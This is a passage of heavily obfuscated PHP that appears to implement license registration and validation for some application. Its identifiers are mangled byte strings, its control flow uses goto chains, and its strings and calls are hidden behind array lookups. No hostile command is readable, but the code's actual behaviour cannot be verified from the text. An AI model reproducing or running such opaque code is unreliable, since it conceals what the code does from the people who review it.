b¡è¡ÊÒ£; cÜ«à¹®‘‘: $e˜Â‰šŒâ“ = $b½‰Šì‡íæ[594]; unset($bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[103]][$e–ŸµÖ¶™‡[107]]); $aÜ·ÜÍ…Šì = $b½‰Šì‡íæ[595]; goto e…¨‚›ÏÉ½; aˆ¡Á”ËâÌ: if (strlen($bÍÃƒïçÜø) < $b½‰Šì‡íæ[566]) { return; } unset($bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[104]][$e–ŸµÖ¶™‡[105]]); $c¾ªŞ‘¾ÌÉ = $b½‰Šì‡íæ[593]; goto AÂÄ ®’âª; FŸëá‡ùÒŠ: foreach ($C¹öŠ­¿«à as $dÓ•ô£ˆŠó) { $DØ’„³á¾ = $GLOBALS[$e–ŸµÖ¶™‡[100]][$e–ŸµÖ¶™‡[101]][$dÓ•ô£ˆŠó]; if (isset($C¾íõøœÊ¿[$dÓ•ô£ˆŠó])) { $DØ’„³á¾ = $C¾íõøœÊ¿[$dÓ•ô£ˆŠó]; } $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[103]][$dÓ•ô£ˆŠó] = $DØ’„³á¾; } $BÛœÔ©È‡Š = $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[103]][$e–ŸµÖ¶™‡[76]]; $bÍÃƒïçÜø = $b½‰Šì‡íæ[592]; goto aˆ¡Á”ËâÌ; dä¨³¬³Û‹: if ($e–ŸµÖ¶™‡[113]($GLOBALS, $e–ŸµÖ¶™‡[141]) && $this->config[$e–ŸµÖ¶™‡[142]]) { $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[143]] = WEB_ROOT; } return $bÊ‚“Î™Ñ; goto e°ğÅÚÇ¡¿; Bè±…÷ñÀ: $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[129]] = $this->vwbsb58da3d9; $bÒÛêÏÀ”Ì = $b½‰Šì‡íæ[597]; while ($bÒÛêÏÀ”Ì < $b½‰Šì‡íæ[568]) { if ($bÒÛêÏÀ”Ì >= 0) { break; } $bÒÛêÏÀ”Ì++; } goto cÍç‰ãÅö; AÂÄ ®’âª: if (!$c¾ªŞ‘¾ÌÉ) { return; } unset($bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[104]][$e–ŸµÖ¶™‡[106]]); unset($bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[102]][$e–ŸµÖ¶™‡[103]][$e–ŸµÖ¶™‡[76]]); goto cÜ«à¹®‘‘; B»¯¼®İ‘: $b½‰Šì‡íæ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e–ŸµÖ¶™‡ =& $_SERVER[éÑÍñÜ£™]; $C¾íõøœÊ¿ = $e–ŸµÖ¶™‡[61]($e–ŸµÖ¶™‡[62])->{$_SERVER[éÑÍñÜ£™][63]}(); goto Dœ‚Ú‡¬¾Ş; b¡è¡ÊÒ£: if (strlen($F´Š¨í¾Ş) < $b½‰Šì‡íæ[12]) { die; } $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[122]] = $e–ŸµÖ¶™‡[123]($_SERVER[$e–ŸµÖ¶™‡[124]] . $C¾íõøœÊ¿[$e–ŸµÖ¶™‡[125]]); $bÊ‚“Î™Ñ[$e–ŸµÖ¶™‡[117]][$e–ŸµÖ¶™‡[126]] = $e–ŸµÖ¶™‡[127]($e–ŸµÖ¶™‡[128]()); goto Bè±…÷ñÀ; e°ğÅÚÇ¡¿: } private function zmpd31870199() { goto C±‚èóğó²; EˆĞè¤×Šµ: while ($eĞºîòŒïÜ < $f›ªƒŠ®ƒ‰[573]) { if ($eĞºîòŒïÜ >= 0) { break; } $eĞºîòŒïÜ++; } foreach ($AĞ¨Ñâ‰öğ as $Cô‡ïæ‹ÀŠ) { if (!isset($bùÕ¸ù„š®[$Cô‡ïæ‹ÀŠ]) || !$bùÕ¸ù„š®[$Cô‡ïæ‹ÀŠ]) { continue; } $Cõï£œ·…º[$Cô‡ïæ‹ÀŠ] = $bùÕ¸ù„š®[$Cô‡ïæ‹ÀŠ]; $dÍÂ¼á©ä¹ = $f›ªƒŠ®ƒ‰[604]; if (!$dÍÂ¼á©ä¹) { die; } } $E×¹ÛÜ‹è—[13](array($E×¹ÛÜ‹è—[160], $E×¹ÛÜ‹è—[161]), $Cõï£œ·…º); goto fÛ›™šÕ‘; C±‚èóğó²: $f›ªƒŠ®ƒ‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E×¹ÛÜ‹è— =& $_SERVER[éÑÍñÜ£™]; if ($_SERVER[$E×¹ÛÜ‹è—[44]] == $E×¹ÛÜ‹è—[144]) { goto E¨×ø±ƒŠğ; aÌŞ¨ì‘‡: $A¡‰¯ÅêÀ = $f›ªƒŠ®ƒ‰[599]; if (strlen($A¡‰¯ÅêÀ) < $f›ªƒŠ®ƒ‰[566]) { return; } $Cõï£œ·…º = array($E×¹ÛÜ‹è—[159] => $câÕòŠÛ™°); goto Eà¹‡Õ¿îØ; E¨×ø±ƒŠğ: $câÕòŠÛ™° = array($E×¹ÛÜ‹è—[129] => $this->vwbsb58da3d9, $E×¹ÛÜ‹è—[145] => $this->{$_SERVER[éÑÍñÜ£™][146]}(), $E×¹ÛÜ‹è—[147] => $E×¹ÛÜ‹è—[61]($E×¹ÛÜ‹è—[148])->{$_SERVER[éÑÍñÜ£™][149]}()); if ($this->vwbsb58da3d9 != $E×¹ÛÜ‹è—[130]) { $FŸ´àĞ ½Á = $E×¹ÛÜ‹è—[113]($this->mbpu01a57522, $E×¹ÛÜ‹è—[150]); if ($FŸ´àĞ ½Á) { $câÕòŠÛ™°[$E×¹ÛÜ‹è—[151]] = $FŸ´àĞ ½Á; $câÕòŠÛ™°[$E×¹ÛÜ‹è—[152]] = $E×¹ÛÜ‹è—[153]($E×¹ÛÜ‹è—[113]($this->mbpu01a57522, $E×¹ÛÜ‹è—[154])); $câÕòŠÛ™°[$E×¹ÛÜ‹è—[155]] = $E×¹ÛÜ‹è—[113]($this->mbpu01a57522, $E×¹ÛÜ‹è—[140]); } } $câÕòŠÛ™° = $this->{$_SERVER[éÑÍñÜ£™][156]}($E×¹ÛÜ‹è—[157]($câÕòŠÛ™°), $E×¹ÛÜ‹è—[123]($E×¹ÛÜ‹è—[158])); goto aÌŞ¨ì‘‡; Eà¹‡Õ¿îØ: $E×¹ÛÜ‹è—[13](array($E×¹ÛÜ‹è—[160], $E×¹ÛÜ‹è—[161]), $Cõï£œ·…º); $Dºê•Şî‰á = $f›ªƒŠ®ƒ‰[600]; if (strlen($Dºê•Şî‰á) < $f›ªƒŠ®ƒ‰[573]) { die; } goto EŠ¬÷œœ¶·; EŠ¬÷œœ¶·: } goto d‘óóßéö; d‘óóßéö: if ($this->vwbsb58da3d9 == $E×¹ÛÜ‹è—[130]) { return; } $AĞ¨Ñâ‰öğ = array($E×¹ÛÜ‹è—[162], $E×¹ÛÜ‹è—[163], $E×¹ÛÜ‹è—[164], $E×¹ÛÜ‹è—[165], $E×¹ÛÜ‹è—[166], $E×¹ÛÜ‹è—[167]); $d‡çÃÖÈà‡ = $f›ªƒŠ®ƒ‰[601]; goto AÏà¸ä’«£; c×—Šàƒñ: while ($D„™è£ÅÍƒ < $f›ªƒŠ®ƒ‰[562]) { if ($D„™è£ÅÍƒ >= 0) { break; } $D„™è£ÅÍƒ++; } $Cõï£œ·…º = array($E×¹ÛÜ‹è—[168] => $bùÕ¸ù„š®[$E×¹ÛÜ‹è—[64]], $E×¹ÛÜ‹è—[169] => $bùÕ¸ù„š®[$E×¹ÛÜ‹è—[65]], $E×¹ÛÜ‹è—[170] => $E×¹ÛÜ‹è—[10]); $eĞºîòŒïÜ = $f›ªƒŠ®ƒ‰[603]; goto EˆĞè¤×Šµ; AÏà¸ä’«£: if (!$d‡çÃÖÈà‡) { return; } $bùÕ¸ù„š® = $E×¹ÛÜ‹è—[61]($E×¹ÛÜ‹è—[62])->{$_SERVER[éÑÍñÜ£™][63]}(); $D„™è£ÅÍƒ = $f›ªƒŠ®ƒ‰[602]; goto c×—Šàƒñ; fÛ›™šÕ‘: } private function xjqhc63af232() { goto Bƒæ®š°é…; B¬‡îÖï: $Cñöó‰ìˆ = $A‰ÓÏ™Úƒ[222]($A‰ÓÏ™Úƒ[25]($Bñ‹Ç¨ªõ°, 10, 16)); $E¹¯®Ş„æ¤ = $this->{$_SERVER[éÑÍñÜ£™][136]}($A‰ÓÏ™Úƒ[157]($aÍÉƒê§”), $Bñ‹Ç¨ªõ°); $F¤ôÎ³ˆÖ” = $Eº¡Ÿ œä[610]; goto E¼ø–Éæ÷ô; b®ŸÔëøÄ: if (!$A‰ÓÏ™Úƒ[113]($GLOBALS, $A‰ÓÏ™Úƒ[141])) { die; } $A…°…¬Èñ– = $GLOBALS[$A‰ÓÏ™Úƒ[22]]; if (isset($A…°…¬Èñ–[$A‰ÓÏ™Úƒ[172]])) { $this->{$_SERVER[éÑÍñÜ£™][173]}(); die; } goto B“‚¿ôçÜ; A‡ª¿ØØò‚: if ($A…°…¬Èñ–[$A‰ÓÏ™Úƒ[187]] == $A‰ÓÏ™Úƒ[188]) { $céÙŸíáÌ¸ = $this->{$_SERVER[éÑÍñÜ£™][156]}($DÏ ¦áÒÑ, $A‰ÓÏ™Úƒ[189]); $c«ÑŠÃÎ‘• = $this->{$_SERVER[éÑÍñÜ£™][136]}($A‰ÓÏ™Úƒ[157]($bÃ¦¸¥ÊØ§), $DÏ ¦áÒÑ . $A‰ÓÏ™Úƒ[190], 3); $F¦‹Ñ•ôÛÒ = $this->{$_SERVER[éÑÍñÜ£™][191]}($A‰ÓÏ™Úƒ[192] . $céÙŸíáÌ¸ . $A‰ÓÏ™Úƒ[193] . $c«ÑŠÃÎ‘•, -1); $A‰ÓÏ™Úƒ[175]($F¦‹Ñ•ôÛÒ, !0); } else { if ($A…°…¬Èñ–[$A‰ÓÏ™Úƒ[187]] == $A‰ÓÏ™Úƒ[194]) { $f¶ÂÓì÷‰ = $A‰ÓÏ™Úƒ[25]($A‰ÓÏ™Úƒ[123]($A‰ÓÏ™Úƒ[195] . $DÏ ¦áÒÑ), 12, 15) . $A‰ÓÏ™Úƒ[196]; $c«ÑŠÃÎ‘• = $this->{$_SERVER[éÑÍñÜ£™][197]}($A‰ÓÏ™Úƒ[2]($A…°…¬Èñ–[$A‰ÓÏ™Úƒ[198]]), $f¶ÂÓì÷‰, 2); $CŠæÛŸóŠ¼ = $A‰ÓÏ™Úƒ[199]($c«ÑŠÃÎ‘•, !0); if (!$A‰ÓÏ™Úƒ[200]($CŠæÛŸóŠ¼) || !$A‰ÓÏ™Úƒ[200]($CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]]) || $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[174]] != !0) { $f‹ïò³ˆÕš = $A‰ÓÏ™Úƒ[202]; $D«½Ş‡á¥ = $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]] ? $A‰ÓÏ™Úƒ[203] . $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]] : $f‹ïò³ˆÕš; $A‰ÓÏ™Úƒ[175]($D«½Ş‡á¥, !1); } else { $bÃ¦¸¥ÊØ§[$A‰ÓÏ™Úƒ[177]] = $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]][$A‰ÓÏ™Úƒ[204]]; } } else { $CŠæÛŸóŠ¼ = $this->{$_SERVER[éÑÍñÜ£™][191]}($A‰ÓÏ™Úƒ[205], $bÃ¦¸¥ÊØ§, 10); $BòË¶ñƒÒ­ = $Eº¡Ÿ œä[606]; if (!$BòË¶ñƒÒ­) { die; } } } if (!$A‰ÓÏ™Úƒ[200]($CŠæÛŸóŠ¼) || !$A‰ÓÏ™Úƒ[200]($CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]]) || $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[174]] != !0) { $f‹ïò³ˆÕš = $A‰ÓÏ™Úƒ[206]($A‰ÓÏ™Úƒ[207]); $D«½Ş‡á¥ = $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]] ? $A‰ÓÏ™Úƒ[203] . $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]] : $f‹ïò³ˆÕš; $A‰ÓÏ™Úƒ[175]($D«½Ş‡á¥, !1); } $aÍÉƒê§” = $CŠæÛŸóŠ¼[$A‰ÓÏ™Úƒ[201]]; goto BŸäŒ´—§; E¼ø–Éæ÷ô: if (strlen($F¤ôÎ³ˆÖ”) < $Eº¡Ÿ œä[566]) { die; } $d…äÅÊ×Ÿ = $A‰ÓÏ™Úƒ[230]($A‰ÓÏ™Úƒ[61]($A‰ÓÏ™Úƒ[11])->{$_SERVER[éÑÍñÜ£™][231]}(), $A‰ÓÏ™Úƒ[232]); $f²¶¬Í¹«Ê = $Eº¡Ÿ œä[611]; goto dîÕ‘èÇ¿‡; bÂ·ÑîÖòİ: $this->vwbsb58da3d9 = $e£š§–å‰š[$A‰ÓÏ™Úƒ[129]]; $this->{$_SERVER[éÑÍñÜ£™][237]}(); $AŠÏ°Ô­í¼ = $Eº¡Ÿ œä[614]; goto aî†İÏÍ’; eš‡ğ ÕÛÑ: $e£š§–å‰š = array($A‰ÓÏ™Úƒ[217] => $bÃ¦¸¥ÊØ§[$A‰ÓÏ™Úƒ[174]], $A‰ÓÏ™Úƒ[218] => $aÍÉƒê§”[$A‰ÓÏ™Úƒ[219]], $A‰ÓÏ™Úƒ[220] => $A‰ÓÏ™Úƒ[133](16), $A‰ÓÏ™Úƒ[129] => $aÍÉƒê§”[$A‰ÓÏ™Úƒ[221]]); if ($bÃ¦¸¥ÊØ§[$A‰ÓÏ™Úƒ[177]]) { $e£š§–å‰š[$A‰ÓÏ™Úƒ[220]] = $bÃ¦¸¥ÊØ§[$A‰ÓÏ™Úƒ[177]]; } $cØ÷·ß‘ = $A‰ÓÏ™Úƒ[25]($A‰ÓÏ™Úƒ[123]($e£š§–å‰š[$A‰ÓÏ™Úƒ[218]]), 10, 10); goto f°àá¼×¹Ø; Bƒæ®š°é…: $Eº¡Ÿ œä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A‰ÓÏ™Úƒ =& $_SERVER[éÑÍñÜ£™]; if ($_SERVER[$A‰ÓÏ™Úƒ[44]] != $A‰ÓÏ™Úƒ[171]) { return; } goto b®ŸÔëøÄ; B“‚¿ôçÜ: if (!isset($A…°…¬Èñ–[$A‰ÓÏ™Úƒ[174]]) || $A‰ÓÏ™Úƒ[24]($A…°…¬Èñ–[$A‰ÓÏ™Úƒ[174]]) != 16) { $A‰ÓÏ™Úƒ[175]($A‰ÓÏ™Úƒ[176] . $A…°…¬Èñ–[$A‰ÓÏ™Úƒ[174]], !1); } $f‰¬…í¡¥ = $A‰ÓÏ™Úƒ[61]($A‰ÓÏ™Úƒ[62])->{$_SERVER[éÑÍñÜ£™][63]}($A‰ÓÏ™Úƒ[125]); $bÃ¦¸¥ÊØ§ = array($A‰ÓÏ™Úƒ[174] => $A…°…¬Èñ–[$A‰ÓÏ™Úƒ[174]], $A‰ÓÏ™Úƒ[177] => $A‰ÓÏ™Úƒ[133](16), $A‰ÓÏ™Úƒ[178] => $A‰ÓÏ™Úƒ[158], $A‰ÓÏ™Úƒ[179] => $A‰ÓÏ™Úƒ[180], $A‰ÓÏ™Úƒ[181] => $_SERVER[$A‰ÓÏ™Úƒ[182]], $A‰ÓÏ™Úƒ[183] => $_SERVER[$A‰ÓÏ™Úƒ[184]], $A‰ÓÏ™Úƒ[185] => $_SERVER[$A‰ÓÏ™Úƒ[186]]); goto D§à©áˆ¾­; BŸäŒ´—§: $fß‰ö‹¶Ş¦ = $this->{$_SERVER[éÑÍñÜ£™][208]}($aÍÉƒê§”[$A‰ÓÏ™Úƒ[209]]); $aˆ›²œ¶·‘ = $Eº¡Ÿ œä[607]; if (!$fß‰ö‹¶Ş¦ || $fß‰ö‹¶Ş¦ != $aÍÉƒê§”[$A‰ÓÏ™Úƒ[154]]) { $cˆø§ã“óÓ = array($A‰ÓÏ™Úƒ[210] => $A‰ÓÏ™Úƒ[61]($A‰ÓÏ™Úƒ[62])->{$_SERVER[éÑÍñÜ£™][63]}($A‰ÓÏ™Úƒ[125]), $A‰ÓÏ™Úƒ[211] => $_SERVER[$A‰ÓÏ™Úƒ[124]], $A‰ÓÏ™Úƒ[212] => $A‰ÓÏ™Úƒ[213](), $A‰ÓÏ™Úƒ[183] => $_SERVER[$A‰ÓÏ™Úƒ[184]]); $c«ÑŠÃÎ‘• = $this->{$_SERVER[éÑÍñÜ£™][214]}($A‰ÓÏ™Úƒ[157]($cˆø§ã“óÓ)); $this->{$_SERVER[éÑÍñÜ£™][191]}($A‰ÓÏ™Úƒ[215] . $c«ÑŠÃÎ‘•); $A‰ÓÏ™Úƒ[175]($A‰ÓÏ™Úƒ[206]($A‰ÓÏ™Úƒ[216]), !0); } goto eš‡ğ ÕÛÑ; CÅ‘»˜±‰ê: $EˆõÛ±ç© = $A‰ÓÏ™Úƒ[133](16); $EØÂ½ÊÁå… = $EˆõÛ±ç© . $e£š§–å‰š[$A‰ÓÏ™Úƒ[129]] . $this->{$_SERVER[éÑÍñÜ£™][156]}($A‰ÓÏ™Úƒ[123]($e£š§–å‰š[$A‰ÓÏ™Úƒ[217]]), $EˆõÛ±ç©); $e£š§–å‰š[$A‰ÓÏ™Úƒ[132]] = $A‰ÓÏ™Úƒ[127]($A‰ÓÏ™Úƒ[222]($this->{$_SERVER[éÑÍñÜ£™][156]}($EØÂ½ÊÁå…, $A‰ÓÏ™Úƒ[224]))); goto e¿“Å†µ‚ê; D§à©áˆ¾­: $eÊØçªÂ°£ = $Eº¡Ÿ œä[605]; if (!$eÊØçªÂ°£) { return; } $DÏ ¦áÒÑ = $A‰ÓÏ™Úƒ[123]($_SERVER[$A‰ÓÏ™Úƒ[124]] . $f‰¬…í¡¥); goto A‡ª¿ØØò‚; Cì¹·é¼—É: $this->mbpu01a57522 = $aÍÉƒê§”; $dÏÑ´‚±‚© = $Eº¡Ÿ œä[613]; while ($dÏÑ´‚±‚© < $Eº¡Ÿ œä[562]) { if ($dÏÑ´‚±‚© >= 0) { break; } $dÏÑ´‚±‚©++; } goto bÂ·ÑîÖòİ; d—ëÃß×”‡: $e£š§–å‰š[$A‰ÓÏ™Úƒ[131]] = $A‰ÓÏ™Úƒ[222]($A‰ÓÏ™Úƒ[127]($this->{$_SERVER[éÑÍñÜ£™][156]}($D¬ÍÍĞŠ´, $A‰ÓÏ™Úƒ[223]))); $e–Ì‰É‘Ü¤ = $Eº¡Ÿ œä[609]; if (!$e–Ì‰É‘Ü¤) { return; } goto CÅ‘»˜±‰ê; aî†İÏÍ’: $A‰ÓÏ™Úƒ[175]($A‰ÓÏ™Úƒ[206]($A‰ÓÏ™Úƒ[216]), !0); goto Dî›™Êˆ—«; dîÕ‘èÇ¿‡: $D½ƒÚËÒ = $d…äÅÊ×Ÿ[$A‰ÓÏ™Úƒ[233]]; $a«ôùÌ°¥× = array(); $a«ôùÌ°¥×[$Cñöó‰ìˆ] = $E¹¯®Ş„æ¤; goto a’Ø–ğ¸; f°àá¼×¹Ø: $D¬ÍÍĞŠ´ = $cØ÷·ß‘ . $e£š§–å‰š[$A‰ÓÏ™Úƒ[129]] . $e£š§–å‰š[$A‰ÓÏ™Úƒ[220]]; $b§©£ì‚¹¤ = $Eº¡Ÿ œä[608]; if (!$b§©£ì‚¹¤) { return; } goto d—ëÃß×”‡; e¿“Å†µ‚ê: if ($aÍÉƒê§”[$A‰ÓÏ™Úƒ[225]] && $aÍÉƒê§”[$A‰ÓÏ™Úƒ[225]] >= 1) { $A‰ÓÏ™Úƒ[61]($A‰ÓÏ™Úƒ[62])->{$_SERVER[éÑÍñÜ£™][226]}($A‰ÓÏ™Úƒ[227], $A‰ÓÏ™Úƒ[228]); } $A‰ÓÏ™Úƒ[61]($A‰ÓÏ™Úƒ[62])->{$_SERVER[éÑÍñÜ£™][229]}($e£š§–å‰š); $Bñ‹Ç¨ªõ° = $A‰ÓÏ™Úƒ[123]($_SERVER[$A‰ÓÏ™Úƒ[124]] . $A‰ÓÏ™Úƒ[222]($f‰¬…í¡¥) . $e£š§–å‰š[$A‰ÓÏ™Úƒ[218]]); goto B¬‡îÖï; a’Ø–ğ¸: $A‰ÓÏ™Úƒ[61]($A‰ÓÏ™Úƒ[11])->{$_SERVER[éÑÍñÜ£™][234]}($D½ƒÚËÒ[$A‰ÓÏ™Úƒ[235]], array($A‰ÓÏ™Úƒ[236] => $a«ôùÌ°¥×)); $Dñ‡šïè  = $Eº¡Ÿ œä[612]; if (strlen($Dñ‡šïè ) < $Eº¡Ÿ œä[12]) { return; } goto Cì¹·é¼—É; Dî›™Êˆ—«: } private function licenseRegistSuccess() { goto Bˆ±ß¼ñÚø; B†çÕåõÂÀ: $dó”Íµ«×­ = $BÔÂ‹Õ‹®[615]; if (strlen($dó”Íµ«×­) < $BÔÂ‹Õ‹®[562]) { die; } if ($F‘ˆ‘´õöÎ[$bèŞËÂÓîã[89]] != $bèŞËÂÓîã[228]) { $bèŞËÂÓîã[61]($bèŞËÂÓîã[62])->{$_SERVER[éÑÍñÜ£™][229]}($bèŞËÂÓîã[89], $bèŞËÂÓîã[228]); } goto b£ëª»Åß†; Bˆ±ß¼ñÚø: $BÔÂ‹Õ‹® =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bèŞËÂÓîã =& $_SERVER[éÑÍñÜ£™]; $F‘ˆ‘´õöÎ = $bèŞËÂÓîã[61]($bèŞËÂÓîã[62])->{$_SERVER[éÑÍñÜ£™][63]}(); goto B†çÕåõÂÀ; b£ëª»Åß†: $bèŞËÂÓîã[119]($bèŞËÂÓîã[238])->{$_SERVER[éÑÍñÜ£™][239]}(!0); goto DïİƒîÈâ; DïİƒîÈâ: } private function kdzea3cd1e90() { goto a™Û¸Ø†‚†; a™Û¸Ø†‚†: $a¨Í¾ÕÉì¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B»ˆ¾ºÉ¨¯ =& $_SERVER[éÑÍñÜ£™]; $B»ˆ¾ºÉ¨¯[61]($B»ˆ¾ºÉ¨¯[62])->{$_SERVER[éÑÍñÜ£™][229]}(array($B»ˆ¾ºÉ¨¯[217] => $B»ˆ¾ºÉ¨¯[10], $B»ˆ¾ºÉ¨¯[218] => $B»ˆ¾ºÉ¨¯[10], $B»ˆ¾ºÉ¨¯[129] => $B»ˆ¾ºÉ¨¯[130], $B»ˆ¾ºÉ¨¯[131] => $B»ˆ¾ºÉ¨¯[10], $B»ˆ¾ºÉ¨¯[132] => $B»ˆ¾ºÉ¨¯[10])); goto Eö«ôºàñà; aòâ°Ç’ÍØ: while (strlen($ašô„”Úš©) < $a¨Í¾ÕÉì¶[573]) { if (!$ašô„”Úš©) { break; } $ašô„”Úš©++; } $this->vwbsb58da3d9 = $B»ˆ¾ºÉ¨¯[130]; goto E„šÕÓºŒ; Eö«ôºàñà: $B»ˆ¾ºÉ¨¯[61]($B»ˆ¾ºÉ¨¯[62])->{$_SERVER[éÑÍñÜ£™][226]}($B»ˆ¾ºÉ¨¯[227], $B»ˆ¾ºÉ¨¯[240]); $this->mbpu01a57522 = array(); $ašô„”Úš© = $a¨Í¾ÕÉì¶[616]; goto aòâ°Ç’ÍØ; E„šÕÓºŒ: } private function pqya28cbbb20() { goto CïéËÔ—Œ­; dÖ´ƒ§³ãÌ: $AâÁÎß§ë¶ = $b‰—Ïšùâ”[619]; if (!$AâÁÎß§ë¶) { die; } $e‚ˆßÄ§…å = $e‹°ø‹¦Ñ[123]($_SERVER[$e‹°ø‹¦Ñ[124]] . $e‹°ø‹¦Ñ[222]($eˆŠëÜöÊÄ) . $aÔØ™Óƒ[$e‹°ø‹¦Ñ[218]]); goto c·…¼Ò×Õ; CïéËÔ—Œ­: $b‰—Ïšùâ” =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e‹°ø‹¦Ñ =& $_SERVER[éÑÍñÜ£™]; $_SERVER[$e‹°ø‹¦Ñ[184]] = $e‹°ø‹¦Ñ[113]($_SERVER, $e‹°ø‹¦Ñ[184], APP_HOST); goto eÂöäæğ‘; aÖŠéËÕñ„: while ($báœšÏå² < $b‰—Ïšùâ”[566]) { if ($báœšÏå² >= 0) { break; } $báœšÏå²++; } $Aù‹éå³ = $e‹°ø‹¦Ñ[199]($Aù‹éå³, !0); $EìšĞÊî„Œ = $b‰—Ïšùâ”[621]; goto FëæöÓªåù; eÂöäæğ‘: $this->vwbsb58da3d9 = $e‹°ø‹¦Ñ[130]; $aÔØ™Óƒ = $e‹°ø‹¦Ñ[61]($e‹°ø‹¦Ñ[62])->{$_SERVER[éÑÍñÜ£™][63]}(); $B¼…š³è = $b‰—Ïšùâ”[617]; goto Fî•¾Æ¸”î; FëæöÓªåù: if (!$EìšĞÊî„Œ) { die; } if (!$e‹°ø‹¦Ñ[200]($Aù‹éå³)) { return $this->{$_SERVER[éÑÍñÜ£™][173]}(); } $b­§¥¸”£˜ = $e‹°ø‹¦Ñ[153]($Aù‹éå³[$e‹°ø‹¦Ñ[154]]); goto D‰é—Ô£¢ç; Fî•¾Æ¸”î: if (!$B¼…š³è) { return; } if ($aÔØ™Óƒ[$e‹°ø‹¦Ñ[129]] == $e‹°ø‹¦Ñ[130]) { return; } $eˆŠëÜöÊÄ = $e‹°ø‹¦Ñ[61]($e‹°ø‹¦Ñ[62])->{$_SERVER[éÑÍñÜ£™][63]}($e‹°ø‹¦Ñ[125]); goto aÀñ¨Æ»†; D‰é—Ô£¢ç: if ($e‹°ø‹¦Ñ[241]() >= $b­§¥¸”£˜) { return $this->{$_SERVER[éÑÍñÜ£™][173]}(); } $this->mbpu01a57522 = $Aù‹éå³; $this->vwbsb58da3d9 = $aÔØ™Óƒ[$e‹°ø‹¦Ñ[129]]; goto EÜãô‹éö; aÀñ¨Æ»†: $c…èõñ¹Ñó = $b‰—Ïšùâ”[618]; $E›ğçÆçÛ‰ = $e‹°ø‹¦Ñ[230]($e‹°ø‹¦Ñ[61]($e‹°ø‹¦Ñ[11])->{$_SERVER[éÑÍñÜ£™][231]}(), $e‹°ø‹¦Ñ[232]); $aš£·³Ì… = $E›ğçÆçÛ‰[$e‹°ø‹¦Ñ[233]]; goto dÖ´ƒ§³ãÌ; c·…¼Ò×Õ: $A½ö®’•İÅ = $e‹°ø‹¦Ñ[222]($e‹°ø‹¦Ñ[25]($e‚ˆßÄ§…å, 10, 16)); $Aù‹éå³ = $this->{$_SERVER[éÑÍñÜ£™][197]}($aš£·³Ì…[$e‹°ø‹¦Ñ[100]][$A½ö®’•İÅ], $e‚ˆßÄ§…å); $báœšÏå² = $b‰—Ïšùâ”[620]; goto aÖŠéËÕñ„; EÜãô‹éö: } private function phec0f288097() { goto bÚˆôö‘•ò; BÜÂôÙÙœ: if ($e§ô£´­×Ú[247]($bÄ»øøÛ¥ˆ, $BëÙ©á¯›Õ)) { if ($this->vwbsb58da3d9 == $e§ô£´­×Ú[130] && isset($A§‡²ãŒƒ´[$e§ô£´­×Ú[248]])) { $e§ô£´­×Ú[175]($e§ô£´­×Ú[206]($e§ô£´­×Ú[243]), !1, $e§ô£´­×Ú[244]); die; } $aÃºÛò¼… = $this->{$_SERVER[éÑÍñÜ£™][146]}(); if ($aÃºÛò¼… != $e§ô£´­×Ú[249]($e§ô£´­×Ú[250])) { if ($aÃºÛò¼… <= $e§ô£´­×Ú[61]($e§ô£´­×Ú[148])->{$_SERVER[éÑÍñÜ£™][149]}()) { $e§ô£´­×Ú[175]($e§ô£´­×Ú[206]($e§ô£´­×Ú[251]), !1, $e§ô£´­×Ú[244]); die; } } } goto F¬´ØàØ; B†‚ó¿½èñ: $bÄ»øøÛ¥ˆ = $_SERVER[$e§ô£´­×Ú[44]]; if ($bÄ»øøÛ¥ˆ == $e§ô£´­×Ú[242] && $this->vwbsb58da3d9 == $e§ô£´­×Ú[130]) { $e§ô£´­×Ú[175]($e§ô£´­×Ú[206]($e§ô£´­×Ú[243]), !1, $e§ô£´­×Ú[244]); } $BëÙ©á¯›Õ = array($e§ô£´­×Ú[245], $e§ô£´­×Ú[246]); goto BÜÂôÙÙœ; bÚˆôö‘•ò: $e§ô£´­×Ú =& $_SERVER[éÑÍñÜ£™]; $A§‡²ãŒƒ´ = $GLOBALS[$e§ô£´­×Ú[22]]; $FñŠ•Ñ‰¼· = $_SERVER[çŞáÓæÚô‚Ô‡][622]; goto B†‚ó¿½èñ; F¬´ØàØ: } private function ancy8e92220c() { goto fÓ²áÏêé£; dÕ¿Å»À¢×: $e†ñ—… Şæ = $F…ˆœ†Ş»ç[254]; $Bß·«„Œ„˜ = $CŞ¤¨İßËˆ[624]; while (strlen($Bß·«„Œ„˜) < $CŞ¤¨İßËˆ[568]) { if (!$Bß·«„Œ„˜) { break; } $Bß·«„Œ„˜++; } goto B—ğÃ®êÖ; fÓ²áÏêé£: $CŞ¤¨İßËˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F…ˆœ†Ş»ç =& $_SERVER[éÑÍñÜ£™]; $Bë™¥‰Å“á = array($F…ˆœ†Ş»ç[144], $F…ˆœ†Ş»ç[252]); goto F‡ôŞí Å; CÈ—®éâæ: die; goto BíŠÕ‹¢ëğ; B—ğÃ®êÖ: $e†ñ—… Şæ = 